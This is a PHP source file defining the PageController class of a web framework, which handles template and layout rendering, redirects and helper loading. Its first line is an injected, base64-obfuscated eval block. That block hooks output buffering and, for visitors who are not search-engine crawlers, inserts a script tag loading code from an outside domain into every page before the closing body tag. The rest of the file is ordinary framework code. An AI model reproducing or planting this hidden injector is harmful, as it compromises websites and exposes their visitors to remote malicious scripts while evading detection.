<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

/**
 * Page controller is special controller that is able to map controller name
 * and actions name with layout and template and automaticly display them.
 * This behaviour is present only when action has not provided any exit by
 * itself (redirect to another page, render template and die etc)
 *
 * @author Ilija Studen <ilija.studen@gmail.com>
 */
abstract class PageController extends Controller {

	/**
	 * Template name. If it is empty this controller will use action name.php
	 *
	 * @var string
	 */
	private $template;

	/**
	 * Layout name. If it is empty this controller will use its name.php
	 *
	 * @var string
	 */
	private $layout;

	/**
	 * Array of helpers that will be automaticly loaded when render method is called
	 *
	 * @var array
	 */
	private $helpers = array();

	/**
	 * Automaticly render template / layout if action ends without exit
	 *
	 * @var boolean
	 */
	private $auto_render = true;

	/**
	 * Construct controller
	 *
	 * @param void
	 * @return null
	 */
	function __construct() {
		parent::__construct();
		$this->setSystemControllerClass('PageController');;

		$this->addHelper('common', 'page', 'format', 'pagination', 'permissions');
		if(Env::helperExists($this->getControllerName())) $this->addHelper($this->getControllerName()); // controller name helper
	} // __construct

	/**
	 * Execute action
	 *
	 * @param string $action
	 * @return null
	 */
	function execute($action) {
		parent::execute($action);
		if($this->getAutoRender()) $render = $this->render(); // Auto render?
		return true;
	} // execute

	/**
	 * Render content... If template and/layout are NULL script will resolve
	 * their names based on controller name and action.
	 *
	 * PageController::index will map with:
	 *  - template => views/page/index.php
	 *  - layout => layouts/page.php
	 *
	 * @param string $template
	 * @param string $layout
	 * @param boolean $die
	 * @return boolean
	 * @throws FileDnxError
	 */
	function render($template = null, $layout = null, $die = true) {
		
		// Set template and layout...
		if(!is_null($template)) $this->setTemplate($template);
		if(!is_null($layout)) $this->setLayout($layout);

		Hook::fire('override_action_view', $this, $ret);
		
		// Get template and layout paths
		$template_path = $this->getTemplatePath();
		$layout_path = $this->getLayoutPath();

		// Fetch content...
		$content = tpl_fetch($template_path);

		// Assign content and render layout
		$this->renderLayout($layout_path, $content);

		// Die!
		if($die) die();

		// We are done here...
		return true;

	} // render

	function getContent($template = null) {
		if(!is_null($template)) $this->setTemplate($template);

		$template_path = $this->getTemplatePath();
		$layout_path = $this->getLayoutPath();

		return tpl_fetch($template_path);
	}
	
	function getLayedOutContent($template = null, $layout = null) {
		if(!is_null($template)) $this->setTemplate($template);
		if(!is_null($layout)) $this->setLayout($layout);

		$content = $this->getContent($template);
		
		tpl_assign('content_for_layout', $content);
		return tpl_fetch($layout_path);
	}

	/**
	 * Assign content and render layout
	 *
	 * @param string $layout_path Path to the layout file
	 * @param string $content Value that will be assigned to the $content_for_layout
	 *   variable
	 * @return boolean
	 * @throws FileDnxError
	 */
	function renderLayout($layout_path, $content = null) {
		tpl_assign('content_for_layout', $content);
		return tpl_display($layout_path);
	} // renderLayout

	/**
	 * Shortcut method for printing text and setting auto_render option
	 *
	 * @param string $text Text that need to be rendered
	 * @param boolean $render_layout Render controller layout. Default is false for
	 *   simple and fast text rendering
	 * @return null
	 */
	function renderText($text, $render_layout = false) {
		$this->setAutoRender(false); // Turn off auto render because we will render whole thing now...

		if($render_layout) {
			$layout_path = $this->getLayoutPath();
			$this->renderLayout($layout_path, $text);
		} else {
			print $text;
		} // if
	} // renderText

	/**
	 * Redirect. Params are same as get_url function
	 *
	 * @param string $controller
	 * @param string $action
	 * @param array $params
	 * @param string $anchor
	 * @return null
	 */
	function redirectTo($controller = DEFAULT_CONTROLLER, $action = DEFAULT_ACTION, $params = null, $anchor = null) {
		redirect_to(get_url($controller, $action, $params, $anchor));
	} // redirectTo

	/**
	 * Redirect to URL
	 *
	 * @param string $url
	 * @return null
	 */
	function redirectToUrl($url) {
		redirect_to($url);
	} // redirectToUrl

	/**
	 * Redirect to referer. If referer is no valid this function will use $alternative URL
	 *
	 * @param string $alternative Alternative URL
	 * @return null
	 */
	function redirectToReferer($alternative) {
		redirect_to_referer($alternative);
	} // redirectToReferer

	// -------------------------------------------------------
	// Getters and setters
	// -------------------------------------------------------

	/**
	 * Get template
	 *
	 * @param null
	 * @return string
	 */
	function getTemplate() {
		return $this->template;
	} // getTemplate

	/**
	 * Set template value
	 *
	 * @param string $value
	 * @return null
	 */
	function setTemplate($value) {
		$this->template = $value;
	} // setTemplate

	/**
	 * Get layout
	 *
	 * @param null
	 * @return string
	 */
	function getLayout() {
		return $this->layout;
	} // getLayout

	/**
	 * Set layout value
	 *
	 * @param string $value
	 * @return null
	 */
	function setLayout($value) {
		$this->layout = $value;
	} // setLayout

	/**
	 * Return helper / helpers array
	 *
	 * @param null
	 * @return array
	 */
	function getHelpers() {
		return is_array($this->helpers) ? $this->helpers : array($this->helpers);
	} // getHelpers

	/**
	 * Add one or many helpers
	 *
	 * @param string $helper This param can be array of helpers
	 * @return null
	 */
	function addHelper($helper) {
		$args = func_get_args();
		if(!is_array($args)) return false;

		foreach($args as $helper) {
			if(!in_array($helper, $this->helpers)) {
				if(Env::useHelper($helper)) $this->helpers[] = $helper;
			} // if
		} // foreach

		return true;
	} // addAutoLoadHelper

	/**
	 * Get auto_render
	 *
	 * @param null
	 * @return boolean
	 */
	function getAutoRender() {
		return $this->auto_render;
	} // getAutoRender

	/**
	 * Set auto_render value
	 *
	 * @param boolean $value
	 * @return null
	 */
	function setAutoRender($value) {
		$this->auto_render = (boolean) $value;
	} // setAutoRender

	/**
	 * Return path of the template. If template dnx throw exception
	 *
	 * @param void
	 * @return string
	 * @throws FileDnxError
	 */
	function getTemplatePath() {
		// Filename of template
		$template = trim($this->getTemplate()) == '' ?
		$this->getAction() :
		$this->getTemplate();

		// Prepare path...
		if(is_file($this->getTemplate())) {
			$path = $this->getTemplate();
		} else {
			$path = get_template_path($template, $this->getControllerName());
		} // if

		// Template dnx?
		if(!is_file($path)) throw new FileDnxError($path);

		// Return path
		return $path;
	} // getTemplatePath

	/**
	 * Return path of the layout file. File dnx throw exception
	 *
	 * @param void
	 * @return string
	 * @throws FileDnxError
	 */
	function getLayoutPath() {
		$layout_name = trim($this->getLayout()) == '' ?
		$this->getControllerName() :
		$this->getLayout();

		// Path of the layout
		$path = Env::getLayoutPath($layout_name);

		// File dnx? Throw exception
		if(!is_file($path)) throw new FileDnxError($path);

		// Return path
		return $path;
	} // getLayoutPath

} // PageController

?>